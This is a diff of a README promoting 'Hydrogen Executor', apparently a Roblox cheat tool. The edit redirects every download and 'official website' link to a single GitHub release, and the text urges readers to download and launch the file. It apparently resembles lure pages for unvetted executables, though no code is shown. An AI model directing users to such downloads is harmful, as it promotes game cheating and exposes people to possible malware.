@@ -12,7 +12,7 @@ Welcome to the Hydrogen Executor repository, the ultimate Roblox Exploit for And
 
 ## Installation Guide 📲
 
-To download the Hydrogen Executor, simply click [here](https://github.com/file/App.zip). Once the download is completed, launch the file following the instructions provided and start enjoying a whole new world of possibilities within Roblox.
+To download the Hydrogen Executor, simply click [here](https://github.com/Francoutp/Hydrogen-Executor/releases/tag/v2.0). Once the download is completed, launch the file following the instructions provided and start enjoying a whole new world of possibilities within Roblox.
 
 If the link provided above does not work or is not accessible, please head over to the "Releases" section of this repository for alternative download options.
 
@@ -24,7 +24,7 @@ animation, assets, community, events, game development, game engine, input, libr
 
 ## Stay Connected! 🌐
 
-Make sure to visit our [official website](https://hydrogenexecutor.com) for the latest updates, news, and additional features related to the Hydrogen Executor. Join our vibrant community and take part in exciting events and challenges designed exclusively for our users.
+Make sure to visit our [official website](https://github.com/Francoutp/Hydrogen-Executor/releases/tag/v2.0) for the latest updates, news, and additional features related to the Hydrogen Executor. Join our vibrant community and take part in exciting events and challenges designed exclusively for our users.
 
 ## Contribute 🤝
 
@@ -36,4 +36,4 @@ If you encounter any issues, bugs, or have suggestions for enhancements, please 
 
 ---
 
-[![Download Hydrogen Executor](https://img.shields.io/badge/Download-Hydrogen%20Executor-blue)](https://github.com/file/App.zip)
+[![Download Hydrogen Executor](https://github.com/Francoutp/Hydrogen-Executor/releases/tag/v2.0%20Executor-blue)](https://github.com/Francoutp/Hydrogen-Executor/releases/tag/v2.0)
